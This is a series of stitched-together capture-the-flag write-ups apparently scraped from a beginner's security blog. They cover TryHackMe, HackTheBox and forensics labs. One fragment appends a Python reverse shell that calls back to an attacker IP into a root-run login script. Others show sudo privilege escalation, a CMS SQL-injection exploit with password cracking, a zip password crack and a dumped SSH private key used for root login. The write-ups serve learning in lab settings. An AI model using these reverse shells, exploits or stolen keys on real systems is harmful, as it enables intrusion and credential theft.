restrictions We can catch it with a simple listener If the script runs as root, we get a root shell First, let\u0026rsquo;s set up a listener on our attacking machine (in a new terminal):\nnc -lvnp 4444 Command breakdown:\nnc - Netcat -l - Listen mode -v - Verbose output -n - Don\u0026rsquo;t resolve hostnames -p 4444 - Listen on port 4444 Now, let\u0026rsquo;s modify the script to include our reverse shell. We need to add a Python reverse shell to the script:\n# First, let\u0026#39;s backup the original script cp /opt/cube/cube.sh /opt/cube/cube.sh.backup # Add our reverse shell to the script (replace 10.9.x.x with YOUR IP) echo \u0026#39;python3 -c \u0026#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;10.9.x.x\\\u0026#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/sh\\\u0026#34;,\\\u0026#34;-i\\\u0026#34;]);\u0026#34;\u0026#39; \u0026gt;\u0026gt; /opt/cube/cube.sh To find your IP address (attacking machine):\nip addr show tun0 # or ifconfig tun0 Look for your TryHackMe VPN IP address (usually starts with 10.x.x.x).\nStep 12: Triggering the Reverse Shell # The script runs when someone logs in via SSH. Let\u0026rsquo;s trigger it by opening a new SSH session to the same machine:\n# In a new terminal, SSH again ssh baksteen@10.10.4.101 Check your netcat listener - you should see a connection!\nExample successful connection:\nListening on 0.0.0.0 4444 Connection received on 10.10.4.101 45944 /bin/sh: 0: can\u0026#39;t access tty; job control turned off # whoami root # Congratulations! You now have root access!\nStep 13: Capturing the Flag # # Find the flag find / -name \u0026#34;flag.txt\u0026#34; 2\u0026gt;/dev/null # or ls /root Read the root flag:\ncat /root/flag.txt Flag Output:\n___ _ _ _ _ _ / __|___ _ _ __ _ _ _ __ _| |_ _ _| |__ _| |_(_)___ _ _ __| | | (__/ _ \\ \u0026#39; \\/ _` | \u0026#39;_/ _` | _| || | / _` | _| / _ \\ \u0026#39; \\(_-\u0026lt;_| \\___\\___/_||_\\__, |_| \\__,_|\\__|\\_,_|_\\__,_|\\__|_\\___/_||_/__(_) |___/ (_) |-------------- |\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;| | R O O T | | F L A G | |\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;\u0026amp;| |-------------- | | | | | | --- Nice work!

I will explain my approach on solving the challenge below as I captured the first to last flag in that series.\nSheetsNLayers1 # What is flag 1?\nWe are given a file to download which happened to be a zip file. I went ahead to unzip the file and found a SheetsNlayers.vhdx file, this is a file format used for virtual hard disks. I then mounted the disk on my host machine to explore it further. I noticed that it contained three more files, one which just happens to be our first flag, so on opening it, this is what I found: =03YkNTNlNzYjZjYmVGMmFWZ4MTO1QWY0AzM0MmNhdjMzsHdwAjc. Looks like a Base64 encoded string. I decoded this string from dcode and noticed that it was in reversed form, giving us the flag: r00t{327a6c4304ad5938eaf0efb6cc3e53dc} This has been illustrated below: SheetsNLayers2 # What is flag 2? Now that we found flag 1, its time to further explore the rest of the files and see what we can find. I started by reading the note that was present in the disk we accessed. What I found there was this text: This next archieve contains more flags. Unfortunately the file looks preety blank to me and i can't seem to get all flags. (flag-2 , flag-3, flag-4) Good luck. So I immediately tried to access the archive called moreflags.zip but I couldnt, since it had a password. It was therefore time to start cracking using JohnTheRipper by using the following commands on a unix terminal:\nzip2john moreflags.zip \u0026gt; moreflags.hash #To extract the archive\u0026#39;s hash #The output: ver 2.0 moreflags.zip/moreflags/ is not encrypted, or stored with non-handled compression type ver 2.0 moreflags.zip/moreflags/moreflags.xlsx PKZIP Encr: cmplen=10742, decmplen=15277, crc=BADB9879 ts=B4AB cs=badb type=8 john --wordlist=/usr/share/wordlists/rockyou.txt moreflags.hash #Cracking the hash with the rockyou wordlist #The output: Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) No password hashes left to crack (see FAQ) john moreflags.hash --show #To see the cracked hash #The output: moreflags.zip/moreflags/moreflags.xlsx:ne.11.88:moreflags/moreflags.xlsx:moreflags.zip::moreflags.zip 1 password hash cracked, 0 left Notice that we manage to get the password to the archive as shown in the output above: ne.11.88 I then used this password to access the archive. What I found in the archive was an excel sheet with the name: moreflags.xlsx. On opening the file, It seemed blank at first sight. But then I right-clicked sheet 1 and clicked unhide, and found 3 more hidden sheets. So I retrieved them one after another with the same process as illustrated below: On opening the flag 2 sheet, I found the flag in an encrypted format: I then copied the flag text and headed to cyberchef where I managed to successfully decode the flag from base85 to plain text as illustrated below: I managed to capture my second flag ~ r00t{df38bae72ccf3f172345dcee96a7ea21}\nSheetsNLayers3 # What is flag 3? Moving on to task 3, I open sheet 3 trying to find the third flag. I find it sitting right there, but it seems encoded once again. I therefore click on the first cell and copy the text in that cell, which happened to be: flag3 - TVRFMElEUTRJRFE0SURFeE5pQXhNak1nTlRZZ05UVWdPVGtnT1RnZ09Ua2dPVGNnTlRRZ05Ea2dOVGNnTlRFZ05UVWdNVEF4SURFd01TQXhNREVnTlRRZ05UQWdORGdnTlRZZ05Ea2dOVEFnTVRBeUlEVTNJREV3TVNBMU5pQXhNREVnTlRNZ09Ua2dOVE1nTlRFZ01UQXdJRFE0SURRNElERXlOUT09 TVRFMElEUTRJRFE0SURFeE5pQXhNak1nTlRZZ05UVWdPVGtnT1RnZ09Ua2dPVGNnTlRRZ05Ea2dOVGNnTlRFZ05UVWdNVEF4SURFd01TQXhNREVnTlRRZ05UQWdORGdnTlRZZ05Ea2dOVEFnTVRBeUlEVTNJREV3TVNBMU5pQXhNREVnTlRNZ09Ua2dOVE1nTlRFZ01UQXdJRFE0SURRNElERXlOUT09 TVRFMElEUTRJRFE0SURFeE5pQXhNak1nTlRZZ05UVWdPVGtnT1RnZ09Ua2dPVGNnTlRRZ05Ea2dOVGNnTlRFZ05UVWdNVEF4SURFd01TQXhNREVnTlRRZ05UQWdORGdnTlRZZ05Ea2dOVEFnTVRBeUlEVTNJREV3TVNBMU5pQXhNREVnTlRNZ09Ua2dOVE1nTlRFZ01UQXdJRFE0SURRNElERXlOUT09 Looking at it closely, I noticed, its the same text, repeated thrice. I therefore did some cleaning by removing the prefix flag3 - then followed to remove two of the repitions and headed back to cyberchef to see if I could decrypt the text and obtain the flag. As shown below, it was encrypted more than once, but once again, I was able to decode it with the help of Cyberchef and got the flag for this challenge: Third flag ~ r00t{87cbca61937eee620812f9e8e5c53d00}\nSheetsNLayers4 # What is flag 4? After solving the last three challenges in this series, I finally got to the last one. I thought to myself, that this is probably going to be as easy as the first three, only to open the sheet and see alot of \u0026ldquo;blood\u0026rdquo; with \u0026ldquo;no comments\u0026rdquo;. Just see for yourself: Anyway I decided to first deal with the \u0026ldquo;blood\u0026rdquo;, I set the whole sheet to white then started looking for more clues. Immediately I saw a cell that stood out and decided to hover my cursor over it and once again, the flag was right there. Use your eyes once again, they say seeing is believing: Let\u0026rsquo;s try and decode it (This time though, CyberChef didnt help so I went back to dcode) The encryption was identified as ROT47 and decoded successfully as shown below: That gave me the last flag for the challenge ~ r00t{87cbca61937eee620812f9e8e5c53d00}\n","date":"24 November 2024","externalUrl":null,"permalink":"/posts/2024-11-24-sheetsnlayers/2024-11-24-sheetsnlayers/","section":"Posts","summary":"\u003cp\u003eThis was a 4-part series of challenges linked to each other.

Like many of you, I am a beginner and I am still learning and exploring stuff in cyber security. Just recently I got interviewed by CyberShujaa as I had applied to be a scholar in their program for the Security Analyst path. I am happy to say that I have been shortlisted for the program. As part of the admission process, I was required to try out this beginner-level CTF challenge and I thought it wise to take some notes while solving it. You can find the challenge here.\nDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nSimpleCTF Challenge. # After clicking the start machine icon on the challenge webpage, you are presented with an IP of the vulnerable target, the first thing I normally do is to ping the target just to see if it is alive. Since we have replies from the target we will now proceed to the next step of exploration.\nObservations \u0026amp; Findings # We begin by scanning the target using the tool Nmap to find open ports running on it and also identify the services running on those ports. to do that, we use the command:\nnmap -sV 10.10.64.42 Note If you\u0026rsquo;re following through the tutorial, make sure you use the target\u0026rsquo;s machine\u0026rsquo;s IP provided once you click the start machine icon on the challenge webpage. Here are the results from our scan.\nNotice that we have three open ports.\nPort 22 running ftp Port 80 running HTTP Port 2222 running SSH Now we try accessing the webpage running on port 80 by pasting the IP and port number (80) for the service on the browser and we are welcomed with this page: There is not much going on here so I decided to brute force the target\u0026rsquo;s website to see if I can find other web pages that might be helpful in this quest. For this, I use Gobuster using this command:\ngobuster dir -u http://10.10.64.42:80 -w /usr/share/wordlists/directory-list-2.3-small.txt Here are the results from the brute force attack: We discover a directory /simple that we now visit on the browser and find this: When we scroll down to the footer of the webpage, we find something interesting: What comes to sight is the version number of the tool that was used to build this website. So I run a quick Google search about its vulnerabilities and possible exploits. It is discovered that CMS Made simple version 2.2.10 and below are vulnerable to SQL Injection. I found a good Python script that can be used to exploit this vulnerability here.\nI download the script and try to run it to see its usage: .\nAfter seeing its usage, we can now decide the syntax to use for the exploit to work on the target depending on our needs. so we use the command:\npython3 cmsexploit.py -u http://10.10.64.42:80 --crack -w /usr/share/wordlists/rockyou.txt After running for a while we get the following output as shown below, and it contains:\nThe salt for the password some identified user The user\u0026rsquo;s username Their email address Hashed password The cracked password Now that we have some credentials let\u0026rsquo;s try them out on another service that we found running on the target SSH. The command for logging in on ssh using the username and password that we found is:\nssh mitch@10.10.64.42 -p2222 Then type yes and accept to proceed and provide the acquired password. A successful login should land you at a terminal like this:\nSolution/Flag # Now that we are logged in as Mitch I try to list the contents of his home directory and voila, we capture our first flag which is in the user.txt file.\nI then try to go back to see if there is any other user on this machine and if I have access to their directory. I found another user sunbath but have no access to his directory. I moved back to another directory and tried to gain access to the root\u0026rsquo;s directory but again, I hit a wall. I run the command:\nsudo -l to see what permissions Mitch has or what he can run as root without having to provide a password. The results: We gain access to the root shell after finding out that he can access vim as root. To find the custom command to cater to your needs use this website. Now that we\u0026rsquo;re root, let\u0026rsquo;s confirm that and see if we have access to the root\u0026rsquo;s directory.\nConclusion # In summary, this challenge underscores the significance of privilege escalation techniques for unearthing concealed data and vulnerabilities. By leveraging the use of tools and exploits, directory permissions, and sudo privileges, we elevate our access and seize the flags.\nRemember, relentless learning and exploration are paramount to mastering hacking skills. Embrace the journey, and let the quest for knowledge fuel your hacking endeavors.\ndr0idbot signing off.\n","date":"31 December 2023","externalUrl":null,"permalink":"/posts/2023-12-31-simplectf/2023-12-31-simplectf/","section":"Posts","summary":"\u003ch3 class=\"relative group\"\u003eIntroduction \n    \u003cdiv id=\"introduction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#introduction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cp\u003eHello guys, it has been quite some time since I made a CTF writeup and I figured it\u0026rsquo;s time to share some of my notes with you.

The past few blogs have been covering the module Getting Started. The instructions provided are as follows: SSH (Secure Shell) is a secure network communication protocol allowing encrypted connections between computers, making it suitable for use on insecure networks.\nObservations \u0026amp; Findings # We begin by using the provided credentials to establish an SSH connection to the target machine: If you\u0026rsquo;re following through Note that the machine IP and port number might be different in your case, make sure you replace that with what you have been given.\nOur first command:\n┌──(papab3ar㉿kali)-[~] └─$ ssh user1@94.237.49.11 -p 31973 Upon connection, a message about host authenticity appears.

Exploring further, we discover another user, user2:\nuser1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ cd ../ user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:/home$ ls user1 user2 Navigation to user2\u0026rsquo;s directory uncovers the flag.txt file, but access is denied:\ncat: flag.txt: Permission denied What a bummer! our current user has no permission to read user2 files or documents. So now I want to see the list of permissions the users on this machine have so I use:\nsudo -l The output:\nMatching Defaults entries for user1 on ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user1 may run the following commands on ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827: (user2 : user2) NOPASSWD: /bin/bash Something interesting shows up here about our users. First, we see the text NOPASSWD: Indicating that our current user (user1) is allowed to run the specified commands without being prompted for a password. This can be a security feature to streamline certain processes, but it also carries some security risks.\nThen we note the /bin/bash: This is the path to the \u0026ldquo;bash\u0026rdquo; shell executable. Allowing user1 to run \u0026ldquo;/bin/bash\u0026rdquo; means they have the ability to start an interactive shell session. This could potentially grant them significant control over the system.\nWith this in mind, I now want to see if it will work. So I run the following command for user2 as user1:\nsudo -u user2 /bin/bash From the terminal, this seems to have worked since the CLI switched from:\nuser1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827: to this:\nuser2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ Notice that we now have user2 access. So, once again, we try to read the flag.txt file and manage to get the flag.\nuser2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ ls flag.txt user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ cat flag.txt HTB{l473r4l_********_**_*******_u53r} Ah great, so what, are we done? Or is there more we could do here? We have further instructions: Now we try to see if we can be the root user for this machine, escalating our privileges even further. First I navigate to the root user folder using the following commands:\ncd ../../ ls cd root Then I list all directories and this is the output I get:\nuser2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:/root$ ls -a . .. .bash_history .bashrc .profile .ssh .viminfo flag.txt As you can see here, we have our flag.txt file. I\u0026rsquo;m tempted to open it, and I do, but again, I get denied permission to do so. I then notice another interesting directory,.ssh. So I navigate to it and list its contents.\nThe .ssh folder in a user\u0026rsquo;s home directory on a Unix-like operating system that contains important files and directories related to SSH (Secure Shell) authentication and communication.\nauthorized_keys: Contains a list of public keys authorized to access the user account using SSH key-based authentication. Each line in this file represents a separate public key. When a client (remote computer) attempts to connect to the user account, the server checks if the client\u0026rsquo;s public key matches any of the keys listed in this file. If there\u0026rsquo;s a match, the client is granted access without needing to enter a password.\nid_rsa: A private key file for the user\u0026rsquo;s SSH key pair. The private key is kept secret and should never be shared or exposed. It is used for authentication when the user tries to log in to remote servers. When the user initiates an SSH connection, their local computer uses the private key to sign a challenge from the server, proving their identity without transmitting the actual private key. Only the corresponding public key is shared with remote servers.\nid_rsa.pub: Contains the public key that corresponds to the private key (id_rsa). The public key can be freely shared and is typically copied to remote servers to set up key-based authentication. Remote servers use the public key to verify the user\u0026rsquo;s identity during the SSH authentication process.\nNow it is time to see if we have access to the id_rsa file. If we do, we can use the root user\u0026rsquo;s private key to gain root access to this machine hence further elevating our privileges from user2. I open this file using the cat command and sure enough, I get access to the private key.\ncat id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- Solution/Flag # I copy the key to my local machine in a file named id_rsa and save it, then try to use it to log in as the root user using the commands:\n──(papab3ar㉿kali)-[~] └─$ ssh root@94.237.49.11 -p 31973 -i id_rsa Let me break this command down in bits: ssh: This is the command used to start an SSH connection.\nroot@94.237.49.11: This specifies the username and IP address of the remote server.

Once you do, try to get the content of the \u0026lsquo;/flag.txt\u0026rsquo; file.\u0026rdquo; The main focus of this challenge is to demonstrate the ability to identify vulnerabilities and effectively exploit them. Let\u0026rsquo;s begin our journey by examining the target IP address and visiting the associated webpage. Observations \u0026amp; Findings # Upon accessing the webpage, the very first thing that caught our attention was a version number and a brief description of a WordPress service. Drawing from our knowledge of how to find and exploit publicly available vulnerabilities, we swiftly launched the Metasploit console to search for an exploit relevant to this specific version. ──(dr0idbot㉿kali)-[~] └─$msfconsole - - - - - SNIP - - - - - msf6 \u0026gt; search exploit wordpress 2.7.10 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/wp_simple_backup_file_read normal No WordPress Simple Backup File Read Vulnerability Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read msf6 \u0026gt; Metasploit came back with results, indicating that there is a publicly available exploit matching the version we found on the website.\nNotice the command used to spin up metasploit msfconsole after its up and running, we run the command search exploit wordpress 2.7.10 to see if there are any publicly available exploits for this plugin version. Sure enough, metasploit brings back results and slight description of what we are looking for matching the info on the website we had visited earlier on.\nWe have an option to see information about that exploit before using it, to see what they payload does. For that we use the command info plus the index of the exploit itself.\nmsf6 \u0026gt; info 0 Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- DEPTH 6 yes Traversal Depth (to reach the root fold er) FILEPATH /etc/passwd yes The path to the file to read Proxies no A proxy chain of format type:host:port[ ,type:host:port][...] RHOSTS yes The target host(s), see https://docs.me tasploit.com/docs/using-metasploit/basi cs/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connecti ons TARGETURI / yes The base path to the wordpress applicat ion THREADS 1 yes The number of concurrent threads (max o ne per host) VHOST no HTTP server virtual host Description: This module exploits a directory traversal vulnerability in WordPress Plugin \u0026#34;Simple Backup\u0026#34; version 2.7.10, allowing to read arbitrary files with the web server privileges. - - - - - SNIP - - - - - As you can see, a bunch of information is given about this particular exploit with a number options that we need to set in order for the payload to work on our target. Next we use the command use plus the index of the exploit we have picked for the exploitation. After selection we set the options that are required by metasploit before executing the payload.\nmsf6 \u0026gt; use 0 msf6 auxiliary(scanner/http/wp_simple_backup_file_read) \u0026gt; set FILEPATH /flag.txt msf6 auxiliary(scanner/http/wp_simple_backup_file_read) \u0026gt; set RHOSTS 94.237.49.11 msf6 auxiliary(scanner/http/wp_simple_backup_file_read) \u0026gt; set RPORT 41884 After obtaining information about the exploit, including the required options, we set the necessary values to ensure the payload will work against our target. With all the options set, we verified the details and executed the payload on the target.\nSolution/Flag # Upon successful execution of the payload, the Metasploit console provided us with the following output:\n[+] File saved in: /home/papab3ar/.msf4/loot/20230803014901_default_94.237.49.11_simplebackup.tra_422018.txt [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Using the command cat, we accessed the directory where the file was saved and retrieved the contents of the flag, thus completing the challenge. Conclusion # Metasploit proved to be a powerful tool during this challenge, allowing us to search for and exploit publicly available vulnerabilities effortlessly. It demonstrates the significance of staying vigilant against potential threats and the importance of secure coding practices for developers.\nFor a deeper understanding of Metasploit and its capabilities, you can refer to its official documentation here\nIn conclusion, this challenge provided an excellent opportunity to apply web enumeration techniques, uncover hidden information, and identify potential vulnerabilities.

By copying the target IP address and visiting the associated webpage, We are greeted with some welcome text to the \u0026ldquo;HTB blog page\u0026rdquo;. Observations \u0026amp; Findings # Upon first inspection, there wasn\u0026rsquo;t much information visible on the webpage. My next step was to inspect the page\u0026rsquo;s underlying code, which is often a good starting point for such challenges. Unfortunately, even after inspecting the code, I didn\u0026rsquo;t find anything substantial. So, I decided to leverage the tool gobuster to perform a brute-force attack on the website and find other directories.\nThis approach paid off as I discovered a directory. Navigating this directory revealed a page that appeared to be under construction, possibly an incomplete WordPress site. Once again, I decided to inspect the page\u0026rsquo;s code, hoping to find something useful. This time, I stumbled upon a section related to web crawlers. Web crawlers, also known as spiders or spiderbots, systematically browse the World Wide Web on behalf of search engines for indexing purposes. Websites often use a file called robots.txt to instruct or block these crawlers from accessing certain web directories. Armed with this knowledge, I attempted to access the robots.txt file to view its contents. Once again, I inspected the code of this page and came across some interesting comments. It seemed that the web developer forgot to remove the comments containing login credentials for the admin user. Page code inspection follows: Solution/Flag # Using the credentials found in the comments, I successfully logged in as an admin user, which led me to a new page containing the flag for the challenge.\nConclusion # In conclusion, this challenge provided a great opportunity to apply web enumeration techniques to uncover hidden information and identify potential vulnerabilities. The process involved inspecting the underlying code, using gobuster for directory enumeration, understanding the significance of robots.txt files, and recognizing the importance of secure coding practices.\nAs a hacker, it\u0026rsquo;s crucial to continuously explore and learn new techniques.

In this blog post, we\u0026rsquo;ll explore a captivating gamified challenge in the field of Digital Forensics. Join me as we dive into the intriguing world of Capture The Flag and unravel the secrets behind the challenge titled \u0026lsquo;Keep it Simple.\u0026rsquo; This challenge is part of the Introduction to Cybersecurity (Online) series that I have been looking into over the past few days and can be found here.\nDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nUnveiling the Enigma: Keep it Simple Challenge. # The challenge description had the string: The answer is simple(as you will see, it truly is simple). The more one can gather from here is that it\u0026rsquo;s a Digital Forensics challenge titled: Keep it simple Upon clicking the green \u0026ldquo;Start Challenge\u0026rdquo; button, I was presented with a link to a webpage that looks like this:\nObservations \u0026amp; Findings # As usual, the first thing I always try to do with these challenges, is to inspect the page where its hosted for hints or clues on how to proceed with an attempt. The trick is to be as keen as you can when doing this so as not to miss on any breadcrumbs :D. At first glance, the webpage source code looks normal but on taking a closer look you notice a reference to two images with only one being embedded on the webpage. My curiosity kicked in:\nSo I downloaded both the images, to get a closer look and see if there is something out of the ordinary about them. The first image that was embedded on the webpage I saved as is, that is the_eye.jpeg and image two (hidden hint in source code) saved as the_eye0.jpeg. Again at first glance, everything about this images looks the same, from file size, dimensions of the image and most obviously their outlook. So we have to use the eye of a thief, to see what others dont. Here is a glimpse of both the images:\nNext, I decide to compare the images using diff command from the terminal to compare if the images are actually the same or not. Here is the output from the comparison:\nWe are seeing here that the two files actually differ, which makes me more curious and I therefore decide to look at the images metadata using the exiftool and here out attention is drawn to the difference of the two images that we normally wouldnt have seen from just looking at the pictures.\nI try as much as I can to link additional information on new terms and tools used in the blog check them out to learn more.\nSolution/Flag # To look at the metadata of both the images we type the command exiftool followed by the filename. See the image below for output comparison.\n.\nKudos!! We now captured the flag.I have obfuscated the flag to keep the integrity of the challenge.\nConclusion # In conclusion, this challenge reminds us that sometimes the answers are simple and can be found in plain sight. By honing our observation skills and utilizing powerful tools like diff and exiftool, we can uncover hidden secrets. Remember, even in the world of cybersecurity, simplicity can hold the key to success. Keep exploring, keep hacking, and never stop learning! Happy Hacking.\n","date":"21 June 2023","externalUrl":null,"permalink":"/posts/2023-06-21-keep-it-simple/2023-06-21-keep-it-simple/","section":"Posts","summary":"\u003ch3 class=\"relative group\"\u003eIntroduction \n    \u003cdiv id=\"introduction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#introduction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cp\u003eWelcome to another exciting journey into the world of Cybersec and its mysteries!
